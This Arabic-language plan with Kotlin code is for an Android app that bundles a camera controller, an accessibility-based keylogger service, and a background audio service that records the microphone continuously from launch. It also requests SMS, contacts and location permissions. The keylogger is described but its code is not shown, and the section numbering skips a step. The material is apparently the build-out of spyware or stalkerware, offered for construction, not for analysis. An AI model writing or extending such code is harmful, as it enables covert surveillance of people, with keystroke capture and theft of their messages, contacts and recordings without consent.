1. هيكل المشروع العام

MainActivity: يدير واجهة المستخدم وأذونات التشغيل.

CameraController: يدير الكاميرا (فتح، معاينة، تسجيل، تبديل).

AudioRecorderService: خدمة تسجيل الصوت مستمرة (سننشئها لاحقًا).

KeyloggerService: خدمة تسجيل ضغطات الأزرار عبر إمكانية الوصول (Accessibility).

StorageManager: إدارة حفظ البيانات والتقارير.

PermissionsManager: تنظيم طلب الأذونات.

2. دمج كاميرا + تسجيل صوت + طلب أذونات في MainActivity

class MainActivity : AppCompatActivity() {

    private lateinit var surfaceView: SurfaceView
    private lateinit var btnSwitchCamera: Button
    private lateinit var btnRecord: Button
    private lateinit var cameraController: CameraController
    private lateinit var cameraManager: CameraManager

    companion object {
        val PERMISSIONS = arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS
            // أضف المزيد حسب الحاجة
        )
        const val PERMISSION_REQUEST_CODE = 101
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        surfaceView = findViewById(R.id.surfaceView)
        btnSwitchCamera = findViewById(R.id.btnSwitchCamera)
        btnRecord = findViewById(R.id.btnRecord)

        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager

        surfaceView.holder.addCallback(object : SurfaceHolder.Callback {
            override fun surfaceCreated(holder: SurfaceHolder) {
                if (allPermissionsGranted()) {
                    initCameraController(holder.surface)
                } else {
                    requestPermissions()
                }
            }
            override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {}
            override fun surfaceDestroyed(holder: SurfaceHolder) {
                cameraController.closeCamera()
            }
        })

        btnSwitchCamera.setOnClickListener {
            cameraController.switchCamera({
                cameraController.startPreview({}, {})
            }, { error -> Log.e("MainActivity", "SwitchCamera Error: $error") })
        }

        btnRecord.setOnClickListener {
            if (cameraController.isRecording) {
                cameraController.stopRecording({
                    runOnUiThread { btnRecord.text = "Start Recording" }
                }, { error -> Log.e("MainActivity", "StopRecording Error: $error") })
            } else {
                cameraController.startRecording({
                    runOnUiThread { btnRecord.text = "Stop Recording" }
                }, { error -> Log.e("MainActivity", "StartRecording Error: $error") })
            }
        }

        // بدء تسجيل الصوت بالخلفية (يمكن تعديلها حسب الحاجة)
        startService(Intent(this, AudioRecorderService::class.java))
    }

    private fun initCameraController(surface: Surface) {
        cameraController = CameraController(this, cameraManager, surface)
        cameraController.openCamera({
            cameraController.startPreview({}, {})
        }, { error -> Log.e("MainActivity", "OpenCamera Error: $error") })
    }

    private fun allPermissionsGranted() = PERMISSIONS.all {
        ActivityCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestPermissions() {
        ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_REQUEST_CODE)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (allPermissionsGranted()) {
                initCameraController(surfaceView.holder.surface)
            } else {
                Toast.makeText(this, "Permissions not granted!", Toast.LENGTH_SHORT).show()
                finish()
            }
        }
    }

    override fun onPause() {
        super.onPause()
        cameraController.closeCamera()
    }
}

4. إعداد خدمة تسجيل الصوت (AudioRecorderService) (للتسجيل المستمر بالخلفية)

class AudioRecorderService : Service() {

    private var mediaRecorder: MediaRecorder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startRecording()
        return START_STICKY
    }

    private fun startRecording() {
        mediaRecorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            val filePath = getExternalFilesDir(Environment.DIRECTORY_MUSIC)?.absolutePath + "/audio_${System.currentTimeMillis()}.m4a"
            setOutputFile(filePath)
            prepare()
            start()
        }
    }

    private fun stopRecording() {
        mediaRecorder?.stop()
        mediaRecorder?.release()
        mediaRecorder = null
    }

    override fun onDestroy() {
        super.onDestroy()
        stopRecording()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}

5. طلب صلاحية إمكانية الوصول (Accessibility) لـ Keylogger:

لإنشاء keylogger يجب تفعيل خدمة إمكانية الوصول Accessibility service من إعدادات الجهاز يدوياً، لذا نطلب من المستخدم فتح صفحة الإعدادات الخاصة بالخدمة.

6. تنظيم الأذونات وطريقة الطلب

الأذونات الضرورية تطلبها عند التشغيل (PermissionsManager أو مباشرة في الـ Activity)

بعض الصلاحيات (كالـ Accessibility أو تثبيت التطبيقات) لا يمكن طلبها برمجياً ويجب توجيه المستخدم لصفحات إعدادات معينة.
